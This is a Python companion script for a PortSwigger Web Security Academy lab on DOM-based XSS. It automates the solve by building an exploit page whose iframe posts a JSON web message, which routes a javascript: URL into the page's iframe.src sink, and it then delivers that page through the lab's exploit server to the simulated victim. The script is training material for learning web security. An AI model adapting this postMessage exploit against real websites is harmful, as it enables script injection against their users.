#!/usr/bin/env python3
"""
DOM XSS using web messages and JSON.parse
PortSwigger Web Security Academy -- DOM-Based Vulnerabilities

Companion script for the writeup: 03-dom-xss-web-messages-json-parse.md

What this does:
    Confirms the home page's message handler runs the incoming data through
    `JSON.parse()`, then routes a `"load-channel"` type's `url` property into
    an `iframe.src` sink -- which accepts `javascript:` URLs the same way
    `location.href` does. The exploit page uses a `<script>` block instead of
    an inline `onload` attribute to post the JSON message, which avoids
    nesting HTML-attribute, JS-string, and JSON quoting inside a single
    attribute value. Delivered through the exploit server; the payload only
    executes once PortSwigger's own victim browser renders the delivered
    page, so the solve is confirmed by polling the lab's home page afterwards.

Usage:
    python 03-dom-xss-web-messages-json-parse.py <lab-url>
    e.g. python 03-dom-xss-web-messages-json-parse.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import json
import re
import sys
import time
import httpx

SOURCE_PATTERN = r"addEventListener\s*\(\s*['\"]message['\"]"


def has_message_listener(client, lab_url):
    r = client.get(lab_url)
    scripts = re.findall(r"<script[^>]*>(.*?)</script>", r.text, re.DOTALL | re.IGNORECASE)
    all_js = "\n".join(scripts)
    return bool(re.search(SOURCE_PATTERN, all_js, re.IGNORECASE))


def get_exploit_server_url(client, lab_url):
    r = client.get(lab_url)
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else None


def exploit_server_deliver(exploit_url, body_html):
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    with httpx.Client(follow_redirects=True, timeout=15) as c:
        c.post(exploit_url, data={
            "urlIsHttps": "on", "responseFile": "/exploit", "responseHead": headers,
            "responseBody": body_html, "formAction": "STORE",
        })
        c.post(exploit_url, data={
            "urlIsHttps": "on", "responseFile": "/exploit", "responseHead": headers,
            "responseBody": body_html, "formAction": "DELIVER_TO_VICTIM",
        })


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    exploit_url = get_exploit_server_url(client, lab_url)
    if not exploit_url:
        print("[-] Could not find this lab's exploit server URL on the home page.")
        return
    print(f"[*] Exploit server: {exploit_url}")
    print(f"[*] Message listener present: {has_message_listener(client, lab_url)}")

    # craft_web_message_json() -- <script>-tag delivery sidesteps the HTML-attribute
    # quoting layer, leaving only a single level of JS-string escaping for the JSON.
    json_payload = {"type": "load-channel", "url": "javascript:print()"}
    json_str = json.dumps(json_payload).replace("'", "\\'")
    exploit_html = (
        f'<iframe src="{lab_url}/" id="jsonframe"></iframe>\n'
        f'<script>\n'
        f'  window.addEventListener("load", function() {{\n'
        f"    document.getElementById('jsonframe').contentWindow.postMessage('{json_str}', '*');\n"
        f'  }});\n'
        f'</script>'
    )
    print(f"[*] Exploit page:\n{exploit_html}")

    exploit_server_deliver(exploit_url, exploit_html)
    print("[*] Exploit stored and delivered to victim.")

    time.sleep(5)
    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved -- JSON message routed a javascript: URL into iframe.src.")
    else:
        print("[-] Not solved yet -- give the victim browser a few more seconds and re-check.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
